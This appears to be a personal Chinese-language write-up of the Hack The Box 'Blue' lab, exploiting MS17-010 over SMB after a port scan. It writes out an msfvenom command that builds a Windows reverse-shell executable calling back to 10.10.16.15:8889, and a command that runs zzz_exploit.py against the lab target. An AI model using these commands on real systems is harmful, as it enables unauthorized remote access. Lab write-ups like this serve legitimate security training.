+++
title = '0X005 Blue'
date = 2024-10-11T14:25:59+08:00
draft = false
private = true
show_reading_time = true
categories = 'HTB'
+++



# 端口扫描

![](/htb_img/WEBRESOURCE2e5d325be6572acc6fe7225b6f12fc65image.png)

![](/htb_img/WEBRESOURCE461282104c88e9e96c68c6156f40047fimage.png)

![](/htb_img/WEBRESOURCEb84c8731af18fe56ae61f82e2ca73235image.png)

# 获取立足点

本来是不太愿意用ms17-010直接打，但是看了一下smb的东西，好像也不太行：

但是尽量不适用msf吧：

这个失败了：

[https://github.com/mez-0/MS17-010-Python](https://github.com/mez-0/MS17-010-Python)

换一个：

简书的讲解：

[https://www.jianshu.com/p/430b2bbfdecc](https://www.jianshu.com/p/430b2bbfdecc)

这种方式也失败了。

最后使用了，这个办法：

![](/htb_img/WEBRESOURCEfd8cb7031252cbea1d9f4dd8ba9d8171image.png)

生成一个木马：

msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.15 LPORT=8889 -f exe EXITFUNC=thread -o shell.exe

![](/htb_img/WEBRESOURCE3fb254004dfaa2ada5be2a32d11e02e3image.png)

编辑zzz_exploit.py：

添加两个\\

![](/htb_img/WEBRESOURCEaa8b069bbfe0c3ee2fbb90d26e55d862image.png)

这个位置，添加相关操作：

![](/htb_img/WEBRESOURCE80351537bd1389c2977159194987b2e5image.png)

使用vim可能会报错，可以使用记事本打开，可能是vim的问题：

![](/htb_img/WEBRESOURCE84dfc6938a3d156908ed49e5df31c8a3image.png)

运行：

python2 zzz_exploit.py 10.10.10.40 ntsvcs

![](/htb_img/WEBRESOURCEf3cc53540399883ad12f7e55611bc064image.png)

![](/htb_img/WEBRESOURCE06ae831433cd098b094bf047d02215f9image.png)

![](/htb_img/WEBRESOURCE89e4c49a655b9af459755049c3e3014fimage.png)